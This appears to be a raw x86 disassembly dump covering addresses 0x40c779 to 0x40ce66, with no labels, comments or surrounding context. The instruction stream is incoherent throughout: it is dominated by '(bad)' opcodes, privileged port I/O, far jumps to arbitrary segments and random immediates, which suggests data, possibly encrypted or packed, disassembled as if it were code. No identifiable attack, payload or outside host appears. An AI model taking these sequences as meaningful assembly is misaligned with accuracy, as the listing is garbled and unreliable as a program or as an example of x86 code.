  40c779:	fcomp  QWORD PTR [edi]
  40c77b:	stc    
  40c77c:	outs   dx,DWORD PTR ds:[esi]
  40c77d:	mov    bl,0x85
  40c77f:	arpl   WORD PTR [ebx-0x4cd1cda9],ax
  40c785:	add    cl,BYTE PTR [ebx+0x7f6b3cb9]
  40c78b:	mov    WORD PTR [eax-0x6899e0fd],ss
  40c791:	or     eax,0xf3247b04
  40c796:	cmp    ebx,ecx
  40c798:	sub    eax,edx
  40c79a:	scas   eax,DWORD PTR es:[edi]
  40c79b:	jae    0x40c77f
  40c79d:	xchg   esp,eax
  40c79e:	in     al,dx
  40c79f:	call   0xe37d8a0b
  40c7a4:	ins    DWORD PTR es:[edi],dx
  40c7a5:	(bad)  
  40c7a7:	and    DWORD PTR [edx*8-0x1b596f37],ebp
  40c7ae:	jmp    0x69ba:0x2a7dcbcb
  40c7b5:	adc    edi,DWORD PTR [ebx]
  40c7b7:	pop    edi
  40c7b8:	js     0x40c7f2
  40c7ba:	imul   edx,DWORD PTR [edi+ecx*2],0x93ab4df8
  40c7c1:	mov    eax,ds:0xc4700766
  40c7c6:	mov    esi,DWORD PTR [ebx]
  40c7c8:	sub    BYTE PTR [ebx+0x3b],al
  40c7cb:	mov    ebx,0xeb1a919a
  40c7d0:	sti    
  40c7d1:	push   eax
  40c7d2:	aad    0x8
  40c7d4:	fiadd  DWORD PTR ds:0x529097d5
  40c7da:	cmp    bl,bh
  40c7dc:	pop    ds
  40c7dd:	shl    DWORD PTR [esi+0x12],0xa2
  40c7e1:	dec    eax
  40c7e2:	xchg   ebx,eax
  40c7e3:	mov    WORD PTR [ebx+esi*8+0x42],gs
  40c7e7:	mov    ah,0x6f
  40c7e9:	mov    al,ds:0xff07d3d1
  40c7ee:	inc    ebx
  40c7ef:	mov    dl,0x64
  40c7f1:	jne    0x40c81c
  40c7f3:	sbb    al,0x5e
  40c7f5:	aam    0x67
  40c7f7:	jmp    0x40a1:0xa6a13ec5
  40c7fe:	jno    0x40c800
  40c800:	std    
  40c801:	dec    esi
  40c802:	push   ebx
  40c803:	inc    ebx
  40c804:	lods   eax,DWORD PTR ds:[esi]
  40c805:	pop    esi
  40c806:	ret    
  40c807:	(bad)  
  40c808:	into   
  40c809:	push   es
  40c80a:	jge    0x40c78f
  40c80c:	pop    DWORD PTR [eax-0x2ea6d94c]
  40c812:	pusha  
  40c813:	mov    dl,0x1d
  40c815:	jmp    FWORD PTR [esi+0x3b]
  40c818:	out    0x62,al
  40c81a:	add    bh,BYTE PTR [esi+ebx*8+0x38]
  40c81e:	xchg   esi,eax
  40c81f:	cdq    
  40c820:	cmp    BYTE PTR [ebx],dh
  40c822:	(bad)  
  40c823:	rcl    BYTE PTR [ebp-0x1],1
  40c826:	(bad)  
  40c827:	ins    BYTE PTR es:[edi],dx
  40c828:	test   eax,0x7d900cdd
  40c82d:	jne    0x40c857
  40c82f:	popf   
  40c830:	sub    eax,0xc2cda9a6
  40c835:	int3   
  40c836:	cmp    ch,BYTE PTR [ebp-0x38]
  40c839:	aas    
  40c83a:	push   0x22
  40c83c:	fisttp WORD PTR [ecx+0x7c5e9e37]
  40c842:	push   cs
  40c843:	cwde   
  40c844:	clc    
  40c845:	aam    0x62
  40c847:	pop    ss
  40c848:	and    ah,BYTE PTR [edx]
  40c84a:	or     al,0xed
  40c84c:	sub    bh,BYTE PTR [esp+edx*4+0x76]
  40c850:	mov    dh,0x11
  40c852:	call   0xce12:0x17a9e338
  40c859:	and    ah,BYTE PTR [edi]
  40c85b:	push   0x5
  40c85d:	(bad)  
  40c85e:	mov    cl,0x32
  40c860:	mov    edx,0xe2967869
  40c865:	lock call DWORD PTR [edx-0x4b50992]
  40c86c:	mov    al,0x92
  40c86e:	popa   
  40c86f:	pop    ds
  40c870:	imul   esp,DWORD PTR [ebp-0x39],0x22
  40c874:	pop    ebp
  40c875:	dec    edx
  40c876:	pop    edx
  40c877:	inc    eax
  40c878:	add    DWORD PTR [ebp+0x4c],edi
  40c87b:	mov    eax,ds:0x9ac2a6e6
  40c880:	dec    ebp
  40c881:	mov    al,0x2
  40c883:	and    ch,BYTE PTR [esi+edi*1]
  40c886:	dec    edx
  40c887:	xchg   esp,eax
  40c888:	leave  
  40c889:	mov    bl,0x52
  40c88b:	test   dl,bl
  40c88d:	(bad)  
  40c88e:	outs   dx,DWORD PTR ds:[esi]
  40c88f:	cli    
  40c890:	jmp    0xd27d3705
  40c895:	mov    ebp,0x43f69ffa
  40c89a:	mov    es,edi
  40c89c:	shl    edi,1
  40c89e:	das    
  40c89f:	mov    al,0xfb
  40c8a1:	and    ecx,DWORD PTR [edx]
  40c8a3:	mov    ch,0x6b
  40c8a5:	or     al,0x4a
  40c8a7:	cmp    edx,DWORD PTR [edx-0x36]
  40c8aa:	push   ebx
  40c8ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8ac:	out    dx,eax
  40c8ad:	add    dh,BYTE PTR [edi+esi*4-0x36]
  40c8b1:	call   0x804c:0xb78c1200
  40c8b8:	push   edx
  40c8b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8ba:	xchg   esi,eax
  40c8bb:	sub    al,0x39
  40c8bd:	mov    bh,0x96
  40c8bf:	dec    ecx
  40c8c0:	int    0x36
  40c8c2:	jno    0x40c898
  40c8c4:	bound  ebp,QWORD PTR [ebp-0x37]
  40c8c7:	pop    ebx
  40c8c8:	jmp    0x40c867
  40c8ca:	cmp    al,0x1f
  40c8cc:	arpl   WORD PTR [edx+0x76ce95c8],si
  40c8d2:	enter  0xd1d3,0x96
  40c8d6:	int3   
  40c8d7:	mov    edi,?
  40c8d9:	push   ds
  40c8da:	adc    al,0xf4
  40c8dc:	js     0x40c91b
  40c8de:	pop    ebp
  40c8df:	xchg   edi,eax
  40c8e0:	sbb    al,0x28
  40c8e2:	inc    ebp
  40c8e3:	jnp    0x40c950
  40c8e5:	push   ss
  40c8e6:	jg     0x40c8c3
  40c8e8:	xor    BYTE PTR [ebp+0x198ed30b],bl
  40c8ee:	cli    
  40c8ef:	les    ecx,FWORD PTR [ebp-0x1c]
  40c8f2:	inc    esi
  40c8f3:	push   ecx
  40c8f4:	or     BYTE PTR [ebx+eax*1],dh
  40c8f7:	popa   
  40c8f8:	mov    al,ds:0xd9a9fd17
  40c8fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8fe:	jbe    0x40c885
  40c900:	xlat   BYTE PTR ds:[ebx]
  40c901:	jecxz  0x40c911
  40c903:	mov    dh,0x18
  40c905:	mov    dl,0xcb
  40c907:	inc    edx
  40c908:	imul   ebx,DWORD PTR [ecx],0x8140a94e
  40c90e:	call   0x3e59000
  40c913:	or     al,0x3f
  40c915:	dec    edx
  40c916:	sbb    DWORD PTR [eax+0x73fb2ba6],ebx
  40c91c:	mov    al,ch
  40c91e:	fdiv   st(5),st
  40c920:	das    
  40c921:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c922:	(bad)  
  40c925:	cmp    dh,ah
  40c927:	and    DWORD PTR [edi],edx
  40c929:	and    DWORD PTR [ecx+0x47],esi
  40c92c:	mov    ch,0xa
  40c92e:	sbb    edi,DWORD PTR [ecx+ebp*8]
  40c931:	mov    BYTE PTR [edx],bh
  40c933:	or     al,0xae
  40c935:	push   ss
  40c936:	dec    ebx
  40c937:	fdivp  st(1),st
  40c939:	mov    bh,0xa6
  40c93b:	daa    
  40c93c:	add    bl,BYTE PTR [ebx-0x80]
  40c93f:	pop    es
  40c940:	stos   DWORD PTR es:[edi],eax
  40c941:	mov    ebp,0xa5c2173a
  40c946:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c947:	fcomp  QWORD PTR [esi+0x769d61e0]
  40c94d:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40c94f:	cmp    al,0x59
  40c951:	inc    ecx
  40c952:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c953:	dec    DWORD PTR [edx+0x2623d8fc]
  40c959:	aaa    
  40c95a:	fisttp QWORD PTR [esi-0x44]
  40c95d:	hlt    
  40c95e:	pop    edi
  40c95f:	xor    eax,0xa986612
  40c964:	iret   
  40c965:	cs adc eax,0x675dbbd8
  40c96b:	outs   dx,DWORD PTR cs:[esi]
  40c96d:	lods   eax,DWORD PTR ds:[esi]
  40c96e:	fisub  WORD PTR [ecx-0x4c9d2dd1]
  40c974:	mov    esi,0x1b376234
  40c979:	push   cs
  40c97a:	xchg   ebp,eax
  40c97b:	sbb    al,0x53
  40c97d:	xchg   ebx,eax
  40c97e:	push   esp
  40c97f:	mov    esp,0x567d8679
  40c984:	cdq    
  40c985:	push   esp
  40c986:	sub    BYTE PTR [ebx-0x5e76342d],ch
  40c98c:	test   eax,0xd96f5df0
  40c991:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c992:	xchg   ebx,eax
  40c993:	sbb    edi,DWORD PTR [edx-0x24cfaed7]
  40c999:	not    DWORD PTR [ecx-0x62dbb653]
  40c99f:	mul    DWORD PTR [eax+0x39]
  40c9a2:	pop    edx
  40c9a3:	and    ebp,DWORD PTR [edi-0x7d5d6f16]
  40c9a9:	inc    ebp
  40c9aa:	(bad)  
  40c9ab:	stos   DWORD PTR es:[edi],eax
  40c9ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9ad:	pop    ecx
  40c9ae:	mov    dl,0xa8
  40c9b0:	aas    
  40c9b1:	or     DWORD PTR [esi-0x5e],esi
  40c9b4:	outs   dx,DWORD PTR ds:[esi]
  40c9b5:	icebp  
  40c9b6:	inc    edx
  40c9b7:	(bad)  
  40c9b9:	push   ebx
  40c9ba:	xchg   esp,eax
  40c9bb:	xchg   BYTE PTR [edi+0x1a],bh
  40c9be:	jmp    0x93f9:0x2a501b72
  40c9c5:	gs xchg ebp,eax
  40c9c7:	xor    ch,BYTE PTR [ecx+ebx*2-0x6800ab3c]
  40c9ce:	ficom  DWORD PTR [esi+ecx*8+0x3e]
  40c9d2:	inc    ecx
  40c9d3:	stc    
  40c9d4:	sub    eax,0xd29a7441
  40c9d9:	mov    ch,0xeb
  40c9db:	bound  edx,QWORD PTR [esi-0x29f69111]
  40c9e1:	mov    dh,0xda
  40c9e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9e4:	leave  
  40c9e5:	jge    0x40c971
  40c9e7:	mov    dl,0x74
  40c9e9:	or     BYTE PTR [ebp-0xc],0x49
  40c9ed:	add    eax,0xf9b8ce4e
  40c9f2:	xchg   BYTE PTR [esi+edx*4+0x5fe85edb],bl
  40c9f9:	jno    0x40c9ea
  40c9fb:	adc    al,0x19
  40c9fd:	pop    edx
  40c9fe:	test   al,0xb9
  40ca00:	pop    ss
  40ca01:	and    eax,0xda29b29f
  40ca06:	jmp    FWORD PTR [ebp+0x9489210]
  40ca0c:	lock sbb al,0x87
  40ca0f:	aam    0xc0
  40ca11:	or     al,0x61
  40ca13:	ret    0x7bfe
  40ca16:	in     al,0x31
  40ca18:	mov    ebx,DWORD PTR [eax]
  40ca1a:	push   0xfffffffa
  40ca1c:	sub    eax,0xd937fc2b
  40ca21:	std    
  40ca22:	mov    ds:0x7b52f379,al
  40ca27:	(bad)  
  40ca28:	test   al,0x39
  40ca2a:	mov    al,ds:0x75db5bc7
  40ca2f:	es mov bh,0xc8
  40ca32:	aad    0x66
  40ca34:	push   0xd9276b06
  40ca39:	add    DWORD PTR [esi],0x46
  40ca3c:	pop    ss
  40ca3d:	jg     0x40c9f7
  40ca3f:	loope  0x40c9f8
  40ca41:	retf   
  40ca42:	loopne 0x40ca5f
  40ca44:	xor    BYTE PTR [esi],0x7d
  40ca47:	test   BYTE PTR [edi],ah
  40ca49:	mov    esp,ebp
  40ca4b:	ins    DWORD PTR es:[edi],dx
  40ca4c:	xchg   ebx,eax
  40ca4d:	sbb    DWORD PTR [ebx],edx
  40ca4f:	repz div ebp
  40ca52:	adc    eax,0xb79aaf75
  40ca57:	sbb    eax,DWORD PTR [edx+0x57]
  40ca5a:	cmp    al,0xe6
  40ca5c:	xchg   edi,eax
  40ca5d:	xchg   ecx,eax
  40ca5e:	bound  edx,QWORD PTR [ebx-0x2861807b]
  40ca64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca66:	jmp    0xce18:0x6cce8b54
  40ca6d:	aas    
  40ca6e:	sbb    DWORD PTR [eax+0x2d6d5ee5],esp
  40ca74:	push   ebp
  40ca75:	fst    QWORD PTR [eax+esi*2]
  40ca78:	stos   BYTE PTR es:[edi],al
  40ca79:	loop   0x40ca21
  40ca7b:	popf   
  40ca7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca7d:	lahf   
  40ca7e:	mov    al,ds:0xa6af8e25
  40ca83:	add    DWORD PTR [ecx],esi
  40ca85:	cmp    ebp,ecx
  40ca87:	cs cmp ecx,ebp
  40ca8a:	test   DWORD PTR [ecx],0xeaaa20b7
  40ca90:	push   esp
  40ca91:	je     0x40ca35
  40ca93:	cmp    dl,BYTE PTR [ecx+0x5e5a8f81]
  40ca99:	fs push ss
  40ca9b:	hlt    
  40ca9c:	ss jmp 0x40ca59
  40ca9f:	and    al,0xe0
  40caa1:	or     al,BYTE PTR es:[ebx-0x6a]
  40caa5:	lods   al,BYTE PTR ds:[esi]
  40caa6:	adc    al,0xb6
  40caa8:	mov    WORD PTR [ecx],fs
  40caaa:	jge    0x40ca9b
  40caac:	cmp    BYTE PTR [edx+0x4a91fd1e],ch
  40cab2:	mov    gs:0xa2501ca7,eax
  40cab8:	ins    BYTE PTR es:[edi],dx
  40cab9:	sub    DWORD PTR [ecx],esi
  40cabb:	mov    ebp,0xb7e1c73b
  40cac0:	push   es
  40cac1:	lods   eax,DWORD PTR ds:[esi]
  40cac3:	and    BYTE PTR [eax+0x6f],0x8c
  40cac7:	and    eax,ebx
  40cac9:	scas   al,BYTE PTR es:[edi]
  40caca:	clc    
  40cacb:	(bad)  
  40cacc:	jle    0x40caad
  40cace:	and    ecx,DWORD PTR [ebp+0x38]
  40cad1:	pusha  
  40cad2:	pop    esi
  40cad3:	inc    esp
  40cad4:	mov    ah,0x94
  40cad6:	imul   ebp,DWORD PTR ds:0x9b016210,0xc5181992
  40cae0:	mov    dl,bl
  40cae2:	ss xchg edx,eax
  40cae4:	pop    ebp
  40cae5:	ds mov esp,0x723e5c5e
  40caeb:	and    ch,dl
  40caed:	not    BYTE PTR [ebx+0x7d9b63de]
  40caf3:	cmp    ecx,DWORD PTR [edx+ebx*8+0x260d7e85]
  40cafa:	pusha  
  40cafb:	leave  
  40cafc:	jmp    DWORD PTR [eax+0x73]
  40caff:	cdq    
  40cb00:	icebp  
  40cb01:	push   ds
  40cb02:	and    al,ch
  40cb04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb05:	mov    bh,0xe2
  40cb07:	(bad)  
  40cb08:	dec    ecx
  40cb09:	pop    ss
  40cb0a:	outs   dx,DWORD PTR ds:[esi]
  40cb0b:	push   0xffffffdf
  40cb0d:	test   al,0xb
  40cb0f:	jbe    0x40cb52
  40cb11:	data16 jge 0x40caad
  40cb14:	pushf  
  40cb15:	imul   esp,DWORD PTR [ebx],0x68
  40cb18:	gs sbb esi,esp
  40cb1b:	nop
  40cb1c:	lds    ebp,FWORD PTR [edx+0x38]
  40cb1f:	push   edi
  40cb20:	imul   edx,DWORD PTR [ebp+0x1931aa3a],0x8ddc09ae
  40cb2a:	xor    al,0x42
  40cb2c:	cmc    
  40cb2d:	(bad)  
  40cb2e:	jp     0x40cb40
  40cb30:	rcr    BYTE PTR ds:0x9e4b89fc,cl
  40cb36:	pop    ss
  40cb37:	xor    bh,bl
  40cb39:	pop    ebx
  40cb3a:	xchg   sp,ax
  40cb3c:	shr    DWORD PTR [esi+esi*1+0x40107fb9],1
  40cb43:	cmp    al,0xb2
  40cb45:	and    al,0xec
  40cb47:	cmp    dl,bl
  40cb49:	pop    DWORD PTR [edx]
  40cb4b:	mov    ds:0x18d4219c,eax
  40cb50:	fs mov edx,esp
  40cb53:	gs inc esp
  40cb55:	(bad)  
  40cb56:	stos   BYTE PTR es:[edi],al
  40cb57:	(bad)  [ecx+0x5e]
  40cb5a:	xor    DWORD PTR [esi+0x6f8f5ab8],eax
  40cb60:	lock loope 0x40cb99
  40cb63:	jg     0x40cbd1
  40cb65:	dec    ebp
  40cb66:	inc    ebp
  40cb67:	dec    ecx
  40cb68:	push   ds
  40cb69:	icebp  
  40cb6a:	aas    
  40cb6b:	out    0xd1,al
  40cb6d:	aaa    
  40cb6e:	pop    edi
  40cb6f:	pop    ss
  40cb70:	or     esp,DWORD PTR [ebp-0x1ef3f525]
  40cb76:	mov    edi,ebp
  40cb78:	pop    edx
  40cb79:	add    al,bl
  40cb7b:	ins    DWORD PTR es:[edi],dx
  40cb7c:	ret    
  40cb7d:	loop   0x40cb64
  40cb7f:	xor    eax,0x3c23fab7
  40cb84:	out    dx,al
  40cb85:	clc    
  40cb86:	adc    bh,BYTE PTR [edx+0x6d]
  40cb89:	or     eax,0x269f6adf
  40cb8e:	xchg   BYTE PTR [ecx+edi*8],dl
  40cb91:	and    bh,BYTE PTR [edi]
  40cb93:	cwde   
  40cb94:	push   ds
  40cb95:	outs   dx,BYTE PTR ds:[esi]
  40cb96:	pop    ebp
  40cb97:	push   esi
  40cb98:	retf   0x5671
  40cb9b:	mov    edi,0x3bbe7280
  40cba0:	sti    
  40cba1:	pop    eax
  40cba2:	outs   dx,DWORD PTR ds:[esi]
  40cba3:	sbb    DWORD PTR [edx],ebp
  40cba5:	xor    al,bh
  40cba7:	push   ss
  40cba8:	mov    ds,WORD PTR [esi+edx*4]
  40cbab:	test   al,0xd4
  40cbad:	mov    ecx,0xaac341a6
  40cbb2:	rcr    ch,0xd7
  40cbb5:	scas   al,BYTE PTR es:[edi]
  40cbb6:	repz jne 0x40cb81
  40cbb9:	mov    ebp,0xdc31306b
  40cbbe:	dec    ebx
  40cbbf:	int3   
  40cbc0:	adc    al,0x53
  40cbc2:	imul   ebx,ebp,0xffffff8f
  40cbc5:	mov    al,ds:0x43ac432c
  40cbca:	and    dh,BYTE PTR [edx]
  40cbcc:	pop    esp
  40cbcd:	rcr    BYTE PTR [ecx+0x3d],0x25
  40cbd1:	pop    ecx
  40cbd2:	repz xchg edi,eax
  40cbd4:	inc    esi
  40cbd5:	repz add ah,BYTE PTR [ecx]
  40cbd8:	xor    DWORD PTR ds:0x14319d2,0xffffff9f
  40cbdf:	lock mov dl,0x34
  40cbe2:	cmp    eax,0x755fddac
  40cbe7:	push   edx
  40cbe8:	cmp    dh,cl
  40cbea:	adc    DWORD PTR [ecx],ecx
  40cbec:	fisub  DWORD PTR [esp+ebp*8+0x2bafed23]
  40cbf3:	sbb    dh,BYTE PTR [eax]
  40cbf5:	imul   edx,DWORD PTR ds:0xbe754313,0x48
  40cbfc:	and    al,0x51
  40cbfe:	int    0x9f
  40cc00:	les    ebp,FWORD PTR [eax-0x3f]
  40cc03:	or     dl,BYTE PTR [ebx]
  40cc05:	ins    BYTE PTR es:[edi],dx
  40cc06:	popa   
  40cc07:	push   ebp
  40cc08:	inc    esp
  40cc09:	lods   al,BYTE PTR ds:[esi]
  40cc0a:	loope  0x40cc78
  40cc0c:	jecxz  0x40cbca
  40cc0e:	or     eax,0xb31042ff
  40cc13:	jl     0x40cc83
  40cc15:	rcr    DWORD PTR [eax],0x8
  40cc18:	fistp  WORD PTR [eax+0x62]
  40cc1b:	(bad)  
  40cc1c:	inc    esi
  40cc1e:	xor    ecx,DWORD PTR [ebx-0x40]
  40cc21:	push   cs
  40cc22:	lea    edx,[edi]
  40cc24:	loopne 0x40cc46
  40cc26:	pop    esi
  40cc27:	pop    ebx
  40cc28:	mov    bh,BYTE PTR [edi]
  40cc2a:	fwait
  40cc2b:	xchg   edi,eax
  40cc2c:	mov    ah,0x7e
  40cc2e:	in     eax,0xb3
  40cc30:	push   esp
  40cc31:	test   DWORD PTR [edi-0x19],ecx
  40cc34:	cli    
  40cc35:	dec    esi
  40cc36:	jge    0x40cc7d
  40cc38:	inc    edi
  40cc39:	sub    BYTE PTR [ebp-0x6b],cl
  40cc3c:	repnz (bad) 
  40cc3e:	mov    ds:0x87373130,eax
  40cc43:	dec    eax
  40cc44:	adc    BYTE PTR fs:[eax],dh
  40cc47:	loopne 0x40cc2d
  40cc49:	outs   dx,BYTE PTR ds:[esi]
  40cc4a:	xlat   BYTE PTR ds:[ebx]
  40cc4b:	mov    eax,ds:0x3b5b4df8
  40cc50:	mov    al,BYTE PTR [ebx-0x1b]
  40cc53:	mov    ebx,edx
  40cc55:	xor    BYTE PTR [edx-0x270c839b],0x31
  40cc5c:	cdq    
  40cc5d:	data16 data16 mov cl,0x76
  40cc61:	pop    ss
  40cc62:	or     esp,ecx
  40cc64:	push   ds
  40cc65:	in     al,0xe8
  40cc67:	lea    ebp,[ebx+esi*4+0x25]
  40cc6b:	or     al,0x59
  40cc6d:	sbb    bh,dl
  40cc6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc70:	push   es
  40cc71:	cmp    ebp,DWORD PTR ds:0x2d413492
  40cc77:	push   ecx
  40cc78:	mov    ds:0x99c2f0a1,eax
  40cc7d:	sti    
  40cc7e:	sahf   
  40cc7f:	ds addr16 push ebx
  40cc82:	or     dl,bh
  40cc84:	or     DWORD PTR [esi],eax
  40cc86:	out    dx,al
  40cc87:	mov    edx,0xb841b2ca
  40cc8c:	xchg   edx,eax
  40cc8d:	and    DWORD PTR [edx+ebx*8-0x27],esi
  40cc91:	stos   BYTE PTR es:[edi],al
  40cc92:	fsubp  st(0),st
  40cc94:	into   
  40cc95:	in     al,dx
  40cc96:	or     DWORD PTR [esi+0x43],0x4b
  40cc9a:	inc    ebx
  40cc9b:	test   esp,edi
  40cc9d:	leave  
  40cc9e:	loope  0x40ccd8
  40cca0:	(bad)
  40cca4:	xor    bh,dl
  40cca6:	outs   dx,DWORD PTR ds:[esi]
  40cca7:	mov    dl,0x55
  40cca9:	popf   
  40ccaa:	ds std 
  40ccac:	cmc    
  40ccad:	push   edi
  40ccae:	pop    ebx
  40ccaf:	js     0x40ccd5
  40ccb1:	or     esp,DWORD PTR [ebp+edi*1+0x6c4cd3f1]
  40ccb8:	daa    
  40ccb9:	mov    BYTE PTR [ecx-0x4e],dh
  40ccbc:	or     eax,0x880185f0
  40ccc1:	not    BYTE PTR [edi+edi*4+0x5]
  40ccc5:	xchg   ebp,eax
  40ccc6:	dec    esi
  40ccc7:	enter  0x2364,0xc
  40cccb:	sub    DWORD PTR [esi-0x4bfe2aa1],ebp
  40ccd1:	mov    BYTE PTR [edx-0x4c],al
  40ccd4:	jg     0x40cd2d
  40ccd6:	stos   DWORD PTR es:[edi],eax
  40ccd7:	jmp    0xf2c7ea2c
  40ccdc:	daa    
  40ccdd:	or     eax,0x4bc02e24
  40cce2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cce3:	and    eax,0xd94d11a5
  40cce8:	jle    0x40cc9a
  40ccea:	and    dh,dl
  40ccec:	pop    eax
  40cced:	into   
  40ccee:	jno    0x40cd31
  40ccf0:	fwait
  40ccf1:	or     esi,DWORD PTR [ecx-0x3c25814f]
  40ccf7:	dec    edx
  40ccf8:	sub    DWORD PTR [edx],ebx
  40ccfa:	int    0xa5
  40ccfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccfd:	inc    edi
  40ccfe:	jbe    0x40cc8c
  40cd00:	mov    esp,0x772e2f39
  40cd05:	sbb    ch,cl
  40cd07:	and    al,0x35
  40cd09:	adc    al,0x3
  40cd0b:	mov    ecx,0x1065fe71
  40cd10:	push   eax
  40cd11:	mov    dl,0x3d
  40cd13:	push   ebp
  40cd14:	dec    ebp
  40cd15:	and    al,0x4b
  40cd17:	inc    ebx
  40cd18:	ss adc ecx,ebp
  40cd1b:	pop    edi
  40cd1c:	push   esp
  40cd1d:	jecxz  0x40cce0
  40cd1f:	repz and al,0x72
  40cd22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd23:	dec    edi
  40cd24:	push   eax
  40cd25:	fwait
  40cd26:	adc    dl,bh
  40cd28:	dec    edi
  40cd29:	es pop ecx
  40cd2b:	out    dx,eax
  40cd2c:	ror    DWORD PTR [edi+0x6f8412f],0xea
  40cd33:	pop    esi
  40cd34:	stos   DWORD PTR es:[edi],eax
  40cd35:	pop    ss
  40cd36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd37:	dec    ecx
  40cd38:	xor    ch,dh
  40cd3a:	cmp    edi,edx
  40cd3c:	cmp    DWORD PTR [ebx+ebx*8+0x4f],ecx
  40cd40:	mov    cl,0xad
  40cd42:	(bad)  
  40cd43:	(bad)  
  40cd44:	xlat   BYTE PTR ds:[ebx]
  40cd45:	popa   
  40cd46:	bound  eax,QWORD PTR [esi-0x2ead9ebd]
  40cd4c:	fs pop esp
  40cd4e:	push   ds
  40cd4f:	imul   edx,ebp,0x4581aea9
  40cd55:	jge    0x40cd14
  40cd57:	aam    0x33
  40cd59:	sti    
  40cd5a:	loope  0x40cd6d
  40cd5c:	bound  eax,QWORD PTR [edi-0x60]
  40cd5f:	ds pusha 
  40cd61:	mov    WORD PTR [eax-0x5840db2],?
  40cd67:	neg    DWORD PTR [edi+0x59]
  40cd6a:	push   ss
  40cd6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd6c:	sub    ebp,DWORD PTR [ecx]
  40cd6e:	push   ebx
  40cd6f:	fsubp  st(2),st
  40cd71:	daa    
  40cd72:	jno    0x40cd35
  40cd74:	push   ds
  40cd75:	xor    dl,BYTE PTR [edx]
  40cd77:	aad    0x78
  40cd79:	jo     0x40cdac
  40cd7b:	pop    esp
  40cd7c:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40cd7e:	push   ebx
  40cd7f:	shl    DWORD PTR [esi],0x83
  40cd82:	adc    cl,BYTE PTR [ecx+0x932e712]
  40cd88:	leave  
  40cd89:	leave  
  40cd8a:	xchg   ecx,eax
  40cd8b:	fs mov ecx,0x8379ed4f
  40cd91:	sub    BYTE PTR [edx+0x50],cl
  40cd94:	push   ebp
  40cd95:	les    ebp,FWORD PTR [eax-0x15]
  40cd98:	in     al,0x2b
  40cd9a:	push   edx
  40cd9b:	push   cs
  40cd9c:	rcr    eax,cl
  40cd9e:	mov    edx,ss
  40cda0:	mov    ch,0xf6
  40cda2:	jge    0x40cd69
  40cda4:	cmp    cl,al
  40cda6:	aaa    
  40cda7:	or     eax,0xbbeb17ea
  40cdac:	ret    0x1ed3
  40cdaf:	fistp  DWORD PTR [edx+0xc]
  40cdb2:	xchg   edi,eax
  40cdb3:	mov    eax,ds:0xd3013cae
  40cdb8:	xchg   ebp,eax
  40cdb9:	test   al,0x76
  40cdbb:	mov    ds:0xc5e61711,al
  40cdc0:	sbb    cl,BYTE PTR [edi-0x27]
  40cdc3:	inc    ecx
  40cdc4:	(bad)  
  40cdc5:	mov    esi,DWORD PTR [eax+0x16]
  40cdc8:	inc    eax
  40cdc9:	(bad)  
  40cdca:	rcr    BYTE PTR [esi+0x466c966],cl
  40cdd0:	call   0xd97a:0x6a225227
  40cdd7:	sbb    ebp,DWORD PTR [eax-0x7]
  40cdda:	mov    dl,0x9
  40cddc:	fimul  WORD PTR [ebx-0xa]
  40cddf:	pop    edi
  40cde0:	dec    eax
  40cde1:	(bad)  
  40cde2:	cmp    ah,BYTE PTR ds:0xb5cea0c5
  40cde8:	iret   
  40cde9:	sbb    eax,DWORD PTR [esi]
  40cdeb:	xor    eax,DWORD PTR [esi]
  40cded:	inc    esp
  40cdee:	push   eax
  40cdef:	inc    esi
  40cdf0:	in     eax,0xac
  40cdf2:	ret    
  40cdf3:	mov    DWORD PTR [ecx],0x6369788f
  40cdf9:	(bad)  
  40cdfb:	(bad)  [esi+0x4e]
  40cdfe:	std    
  40cdff:	or     dl,BYTE PTR ds:0x6f823074
  40ce05:	sub    al,0xf8
  40ce07:	(bad)  
  40ce08:	or     BYTE PTR [edi+0x54],bl
  40ce0b:	xchg   edi,eax
  40ce0c:	jmp    0x40ce43
  40ce0e:	ss int 0xe5
  40ce11:	rol    DWORD PTR [ebx],cl
  40ce13:	out    dx,al
  40ce14:	ins    BYTE PTR es:[edi],dx
  40ce15:	sub    eax,0xcf03c23a
  40ce1a:	shl    DWORD PTR [ebp-0x49],0x61
  40ce1e:	push   es
  40ce1f:	out    dx,al
  40ce20:	pop    edi
  40ce21:	imul   ebx,DWORD PTR [ebp+0x2b442157],0xf1ff62df
  40ce2b:	ret    0x30e0
  40ce2e:	add    ebx,eax
  40ce30:	jle    0x40ceaa
  40ce32:	pop    esi
  40ce33:	out    0xc4,al
  40ce35:	xor    DWORD PTR [ebx-0x42332e53],esp
  40ce3b:	dec    edi
  40ce3c:	xor    al,0x8e
  40ce3e:	mov    ebp,fs
  40ce40:	pop    esi
  40ce41:	adc    eax,0x816ecaf2
  40ce46:	inc    ecx
  40ce47:	div    DWORD PTR [eax]
  40ce49:	mov    DWORD PTR [edi-0x5b],edx
  40ce4c:	or     DWORD PTR [ebx+0x49c1c890],esi
  40ce52:	or     ebp,ecx
  40ce54:	sti    
  40ce55:	or     ebx,DWORD PTR [ecx+0x33]
  40ce58:	imul   edi,DWORD PTR [esp+ebx*4],0xffffff89
  40ce5c:	aaa    
  40ce5d:	arpl   WORD PTR ss:[ecx+0x20cfd671],bx
  40ce64:	mul    BYTE PTR [esi]
  40ce66:	jbe    0x40ce46
